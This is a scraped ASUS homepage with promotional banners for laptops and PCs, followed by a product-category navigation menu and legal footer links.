 Work reimagined, with AI   [Learn more](https://www.asus.com/laptops/for-work/expertbook/expertbook-p5-p5405/) [![It's EHA Reader Awards 2024 which was voted by 20 million readers from European Hardware Association, and this year, we have 3 product categories been voted as the best, include MB, Gaming LCD, and Mini PCs.](/WebsitesBanner/global/banners/lavu05c6mipvdzsc/lavu05c6mipvdzsc-2_0_desktop_2_1X.jpg)](https://asus.click/EHA24_PR)      [![](/WebsitesBanner/global/banners/lavu05c6mipvdzsc/lavu05c6mipvdzsc-3_0_desktop_3_1X.webp)](https://www.asus.com/displays-desktops/tower-pcs/expertcenter/expertcenter-d9-mini-tower-d901mdr/)   ![](/WebsitesBanner/global/banners/lavu05c6mipvdzsc/lavu05c6mipvdzsc-3_1_desktop_3_1X.png) Enterprise-grade security and scalable manageability   [Learn more](https://www.asus.com/displays-desktops/tower-pcs/expertcenter/expertcenter-d9-mini-tower-d901mdr/) [![ASUS Zenbook DUO](/WebsitesBanner/global/banners/lavu05c6mipvdzsc/lavu05c6mipvdzsc-4_0_desktop_4_1X.jpg)](https://www.asus.com/laptops/for-home/zenbook/asus-zenbook-duo-2024-ux8406/)
ASUS Zenbook DUO
 Let’s DUO it A new AI era begins  [Learn more](https://www.asus.com/laptops/for-home/zenbook/asus-zenbook-duo-2024-ux8406/) [![ProArt PZ13](/WebsitesBanner/global/banners/lavu05c6mipvdzsc/lavu05c6mipvdzsc-5_0_desktop_5_1X.webp)](https://www.asus.com/laptops/for-creators/proart/proart-pz13-ht5306/)   ![ProArt PZ13](/WebsitesBanner/global/banners/lavu05c6mipvdzsc/lavu05c6mipvdzsc-5_1_desktop_5_1X.png) Creativity Unplugged, Anywhere A new AI era begins  [Learn more](https://www.asus.com/laptops/for-creators/proart/proart-pz13-ht5306/)
      ![previous image](data:image/svg+xml;base64...) ![next image](data:image/svg+xml;base64...)
## Shop and Learn

  Mobile / Handhelds [Phones](https://www.asus.com/mobile-handhelds/phones/all-series/)Wearable & HealthcareGaming Handhelds[Accessories](https://www.asus.com/mobile-handhelds/accessories/all-series/) Laptops [For Home](https://www.asus.com/laptops/for-home/all-series/)[For Work](https://www.asus.com/laptops/for-work/all-series/)[For Creators](https://www.asus.com/laptops/for-creators/all-series/)[For Students](https://www.asus.com/laptops/for-students/all-series/)[For Gaming](https://www.asus.com/laptops/for-gaming/all-series/)[Accessories](https://www.asus.com/laptops/accessories/all-series/)SoftwareTechnology / InnovationsAI PCCopilot+ PC Displays / Desktops [Monitors](https://www.asus.com/displays-desktops/monitors/all-series/)[Projectors](https://www.asus.com/displays-desktops/projectors/all-series/)[All-in-One PCs](https://www.asus.com/displays-desktops/all-in-one-pcs/all-series/)[Tower PCs](https://www.asus.com/displays-desktops/tower-pcs/all-series/)[Gaming Tower PCs](https://www.asus.com/displays-desktops/gaming-tower-pcs/all-series/)[NUCs](https://www.asus.com/displays-desktops/nucs/all-series/)[Mini PCs](https://www.asus.com/displays-desktops/mini-pcs/all-series/)[Workstations](https://www.asus.com/displays-desktops/workstations/all-series/)[Accessories](https://www.asus.com/displays-desktops/accessories/all-series/)SoftwareWarrantyGlasses Motherboards / Components [Motherboards](https://www.asus.com/motherboards-components/motherboards/all-series/)[Graphics Cards](https://www.asus.com/motherboards-components/graphics-cards/all-series/)[Cases](https://www.asus.com/motherboards-components/cases/all-series/)[Cooling](https://www.asus.com/motherboards-components/cooling/all-series/)[Power Supply Units](https://www.asus.com/motherboards-components/power-supply-units/all-series/)[Sound Cards](https://www.asus.com/motherboards-components/sound-cards/all-series/)[Optical Drives](https://www.asus.com/motherboards-components/optical-drives/all-series/)[Data Storage](https://www.asus.com/motherboards-components/data-storage/all-series/)[External Graphics Docks](https://www.asus.com/motherboards-components/external-graphics-docks/all-series/)Single Board ComputersSoftware Networking / IoT / Servers [WiFi 7](https://www.asus.com/networking-iot-servers/wifi-7/all-series/)[WiFi 6](https://www.asus.com/networking-iot-servers/wifi-6/all-series/)[WiFi Routers](https://www.asus.com/networking-iot-servers/wifi-routers/all-series/)[Whole Home Mesh WiFi System](https://www.asus.com/networking-iot-servers/whole-home-mesh-wifi-system/all-series/)[Business Network Solutions](https://www.asus.com/networking-iot-servers/business-network-solutions/all-series/)Range ExtendersModem RoutersAdapters[Wired Networking](https://www.asus.com/networking-iot-servers/wired-networking/all-series/)[Intelligent Robots](https://www.asus.com/networking-iot-servers/intelligent-robots/all-series/)[AIoT & Industrial Solutions](https://www.asus.com/networking-iot-servers/aiot-industrial-solutions/all-series/)[Servers](https://www.asus.com/networking-iot-servers/servers/all-series/)[Smart Home](https://www.asus.com/networking-iot-servers/smart-home/all-series/) Accessories [Keyboards](https://www.asus.com/accessories/keyboards/all-series/)[Mice and Mouse Pads](https://www.asus.com/accessories/mice-and-mouse-pads/all-series/)[Headsets and Audio](https://www.asus.com/accessories/headsets-and-audio/all-series/)[Streaming Kits](https://www.asus.com/accessories/streaming-kits/all-series/)[Apparel Bags and Gear](https://www.asus.com/accessories/apparel-bags-and-gear/all-series/)[Cases and Protection](https://www.asus.com/accessories/cases-and-protection/all-series/)[Adapters and Chargers](https://www.asus.com/accessories/adapters-and-chargers/all-series/)Wireless Charger[Docks Dongles and Cable](https://www.asus.com/accessories/docks-dongles-and-cable/all-series/)[Power Banks](https://www.asus.com/accessories/power-banks/all-series/)Stylus[Controller](https://www.asus.com/accessories/controller/all-series/)[Gimbal](https://www.asus.com/accessories/gimbal/all-series/)

     Global / English
©ASUSTeK Computer Inc. All rights reserved.
 [Terms of Use Notice](https://www.asus.com/terms_of_use_notice_privacy_policy/official-site/)[Privacy Policy](https://www.asus.com/terms_of_use_notice_privacy_policy/privacy_policy/)[Export Control and Sanctions Compliance](https://www.asus.com/terms_of_use_notice_privacy_policy/export-control-and-sanctions-compliance)
Cookie Settings


